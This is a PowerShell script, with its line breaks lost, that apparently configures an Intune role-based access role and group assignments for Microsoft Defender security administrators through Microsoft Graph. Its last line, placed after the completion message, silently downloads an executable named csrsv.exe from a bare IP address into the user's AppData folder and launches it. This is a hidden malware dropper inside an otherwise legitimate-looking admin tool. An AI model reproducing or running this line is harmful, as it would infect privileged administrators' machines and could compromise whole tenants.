[CmdletBinding()]Param([Parameter(Mandatory=$true, HelpMessage="AdminUser@myenvironment.onmicrosoft.com")]$AdminUser,[Parameter(Mandatory=$false, HelpMessage="MySecAdminGroup")][string]$SecAdminGroup,[Parameter(Mandatory=$false, HelpMessage="c:\mylist.txt")]$SecurityGroupList)if ($SecurityGroupList){$SecurityGroupList = Get-Content "$SecurityGroupList"}$AADEnvironment = (New-Object "System.Net.Mail.MailAddress" -ArgumentList $AdminUser).Host$RBACRoleName    = "MDATP SecAdmin"  $SecurityGroup   = "MDATP SecAdmin SG"  $User = $AdminUserfunction Get-AuthToken {[cmdletbinding()]param([Parameter(Mandatory=$true)]$User)$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User$tenant = $userUpn.HostWrite-Host "Checking for AzureAD module..."$AadModule = Get-Module -Name "AzureAD" -ListAvailableif ($AadModule -eq $null) {Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"$AadModule = Get-Module -Name "AzureADPreview" -ListAvailable}if ($AadModule -eq $null) {Write-HostWrite-Host "AzureAD Powershell module not installed..." -f RedWrite-Host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f YellowWrite-Host "Script can't continue..." -f RedWrite-Hostexit}if($AadModule.count -gt 1){$Latest_Version = ($AadModule | Select-Object version | Sort-Object)[-1]$aadModule = $AadModule | Where-Object { $_.version -eq $Latest_Version.version }if($AadModule.count -gt 1){$aadModule = $AadModule | Select-Object -Unique}$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}else {$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"$redirectUri = "urn:ietf:wg:oauth:2.0:oob"$resourceAppIdURI = "https://graph.microsoft.com"$authority = "https://login.microsoftonline.com/$Tenant"try {$authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority$platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"$userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")$authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Resultif($authResult.AccessToken){$authHeader = @{'Content-Type'='application/json''Authorization'="Bearer " + $authResult.AccessToken'ExpiresOn'=$authResult.ExpiresOn}return $authHeader}else {Write-HostWrite-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor RedWrite-Hostbreak}}catch {Write-Host $_.Exception.Message -f RedWrite-Host $_.Exception.ItemName -f RedWrite-Hostbreak}}Function Test-JSON(){param ($JSON)try {$TestJSON = ConvertFrom-Json $JSON -ErrorAction Stop$validJson = $true}catch {$validJson = $false$_.Exception}if (!$validJson){Write-Host "Provided JSON isn't in valid JSON format" -f Redbreak}}Function Get-AADGroup(){[cmdletbinding()]param($GroupName,$id,[switch]$Members)$graphApiVersion = "v1.0"$Group_resource = "groups"try {if($id){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($GroupName -eq "" -or $GroupName -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}else {if(!$Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"$Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Valueif($Group){$GID = $Group.id$Group.displayNameWrite-Host$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"Write-Hostbreak}}Function Add-RBACRole(){[cmdletbinding()]param($JSON)$graphApiVersion = "Beta"$Resource = "deviceManagement/roleDefinitions"try {if(!$JSON){Write-Host "No JSON was passed to the function, provide a JSON variable" -f Redbreak}Test-JSON -JSON $JSON$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $Json -ContentType "application/json"}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"Write-Hostbreak}}Function Get-RBACRole(){[cmdletbinding()]param($Name)$graphApiVersion = "v1.0"$Resource = "deviceManagement/roleDefinitions"try {if($Name){$QueryString = "?`$filter=contains(displayName, '$Name')"$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)$($QueryString)"$rbacRoles = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value$customRbacRoles = $rbacRoles | Where-Object { $_isBuiltInRoleDefinition -eq $false }return $customRbacRoles}else {$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"Write-Hostbreak}}Function Assign-RBACRole(){[cmdletbinding()]param($Id,$DisplayName,$MemberGroupId,$TargetGroupId)$graphApiVersion = "Beta"$Resource = "deviceManagement/roleAssignments"try {if(!$Id){Write-Host "No Policy Id specified, specify a valid Application Id" -f Redbreak}if(!$DisplayName){Write-Host "No Display Name specified, specify a Display Name" -f Redbreak}if(!$MemberGroupId){Write-Host "No Member Group Id specified, specify a valid Target Group Id" -f Redbreak}if(!$TargetGroupId){Write-Host "No Target Group Id specified, specify a valid Target Group Id" -f Redbreak}$JSON = @"{"id":"","description":"","displayName":"$DisplayName","members":["$MemberGroupId"],"scopeMembers":["$TargetGroupId"],"roleDefinition@odata.bind":"https://graph.microsoft.com/beta/deviceManagement/roleDefinitions('$ID')"}"@$uri = "https://graph.microsoft.com/$graphApiVersion/$Resource"Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $JSON -ContentType "application/json"}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"Write-Hostbreak}}Write-Hostif($global:authToken){$DateTime = (Get-Date).ToUniversalTime()$TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutesif($TokenExpires -le 0){Write-Host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor YellowWrite-Hostif($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your Global Admin user for Azure Authentication (e.g. globaladmin@myenvironment.onmicrosoft.com):"Write-Host}$global:authToken = Get-AuthToken -User $User}}else {if($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your Global Admin user for Azure Authentication (e.g. globaladmin@myenvironment.onmicrosoft.com):"Write-Host}$global:authToken = Get-AuthToken -User $User}$JSON = @"{"@odata.type": ""displayName": "$RBACRoleName","description": "Role with access to modify Intune SecuriyBaselines and DeviceConfigurations","permissions": [{"actions": ["Microsoft.Intune_Organization_Read","Microsoft.Intune/SecurityBaselines/Assign","Microsoft.Intune/SecurityBaselines/Create","Microsoft.Intune/SecurityBaselines/Delete","Microsoft.Intune/SecurityBaselines/Read","Microsoft.Intune/SecurityBaselines/Update","Microsoft.Intune/DeviceConfigurations/Assign","Microsoft.Intune/DeviceConfigurations/Create","Microsoft.Intune/DeviceConfigurations/Delete","Microsoft.Intune/DeviceConfigurations/Read","Microsoft.Intune/DeviceConfigurations/Update"]}],"isBuiltInRoleDefinition": false}"@Write-Host "Configuring MDATP Intune SecAdmin Role..." -ForegroundColor CyanWrite-HostWrite-Host "Connecting to Azure AD environment: $AADEnvironment..." -ForegroundColor YellowWrite-Host$RBAC_Roles = Get-RBACRoleif($RBAC_Roles | Where-Object { $_.displayName -eq "$RBACRoleName" }){Write-Host "Intune Role already exists with name '$RBACRoleName'..." -ForegroundColor RedWrite-Host "Script can't continue..." -ForegroundColor RedWrite-Hostbreak}Write-Host "Adding new RBAC Role: $RBACRoleName..." -ForegroundColor YellowWrite-Host "JSON:"Write-Host $JSONWrite-Host$NewRBACRole = Add-RBACRole -JSON $JSON$NewRBACRoleID = $NewRBACRole.idWrite-Host "Getting Id for new role..." -ForegroundColor Yellow$Updated_RBAC_Roles = Get-RBACRole$NewRBACRoleID = ($Updated_RBAC_Roles | Where-Object {$_.displayName -eq "$RBACRoleName"}).idWrite-Host "$NewRBACRoleID"Write-Hostif($SecAdminGroup){Write-Host "Verifying group '$SecAdminGroup' exists..." -ForegroundColor YellowConnect-AzureAD -AzureEnvironmentName AzureCloud -AccountId $AdminUser | Out-Null$ValidatedSecAdminGroup = (Get-AzureADGroup -SearchString $SecAdminGroup).ObjectIdif ($ValidatedSecAdminGroup){Write-Host "AAD Group '$SecAdminGroup' exists" -ForegroundColor GreenWrite-Host ""Write-Host "Adding AAD group $SecAdminGroup - $ValidatedSecAdminGroup to MDATP Role..." -ForegroundColor Yellowtry {[System.Guid]::Parse($ValidatedSecAdminGroup) | Out-NullWrite-Host "ObjectId: $ValidatedSecAdminGroup" -ForegroundColor GreenWrite-Host}catch {Write-Host "ObjectId: $ValidatedSecAdminGroup is not a valid ObjectId" -ForegroundColor RedWrite-Host "Verify that your security group list only contains valid ObjectIds and try again." -ForegroundColor Cyanexit -1}Write-Host "Adding security group to RBAC role $RBACRoleName ..." -ForegroundColor YellowAssign-RBACRole -Id $NewRBACRoleID -DisplayName 'MDATP RBAC Assignment' -MemberGroupId $ValidatedSecAdminGroup -TargetGroupId "default"}else {Write-Host "Group '$SecAdminGroup' does not exist. Please run script again and specify a valid group." -ForegroundColor RedWrite-Hostbreak}}if($SecurityGroupList){Write-Host "Validating Security Groups to add to Intune Role:" -ForegroundColor Yellowforeach ($SecurityGroup in $SecurityGroupList) {try {[System.Guid]::Parse($SecurityGroup) | Out-NullWrite-Host "ObjectId: $SecurityGroup" -ForegroundColor Green}catch {Write-Host "ObjectId: $SecurityGroup is not a valid ObjectId" -ForegroundColor RedWrite-Host "Verify that your security group list only contains valid ObjectIds and try again." -ForegroundColor Cyanexit -1}}$ValidatedSecurityGroupList = $SecurityGroupList -join "`",`""$SecurityGroupList$ValidatedSecurityGroupListWrite-Host ""Write-Host "Adding security groups to RBAC role '$RBACRoleName'..." -ForegroundColor YellowAssign-RBACRole -Id $NewRBACRoleID -DisplayName 'MDATP RBAC Assignment' -MemberGroupId $ValidatedSecurityGroupList -TargetGroupId "default"}Write-Host "Retrieving permissions for new role: $RBACRoleName..." -ForegroundColor YellowWrite-Host$RBAC_Role = Get-RBACRole | Where-Object { $_.displayName -eq "$RBACRoleName" }Write-Host $RBAC_Role.displayName -ForegroundColor GreenWrite-Host $RBAC_Role.id -ForegroundColor Cyan$RBAC_Role.RolePermissions.resourceActions.allowedResourceActionsWrite-HostWrite-Host "Members of RBAC Role '$RBACRoleName' should now have access to Security Baseline and" -ForegroundColor Cyanwrite-host "Onboarded machines tiles in Microsoft Defender Security Center." -ForegroundColor CyanWrite-HostWrite-Host "https://securitycenter.windows.com/configuration-management"Write-HostWrite-Host "Add users and groups to the new role assignment 'MDATP RBAC Assignment' as needed." -ForegroundColor CyanWrite-HostWrite-Host "Configuration of MDATP Intune SecAdmin Role complete..." -ForegroundColor GreenWrite-Host(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")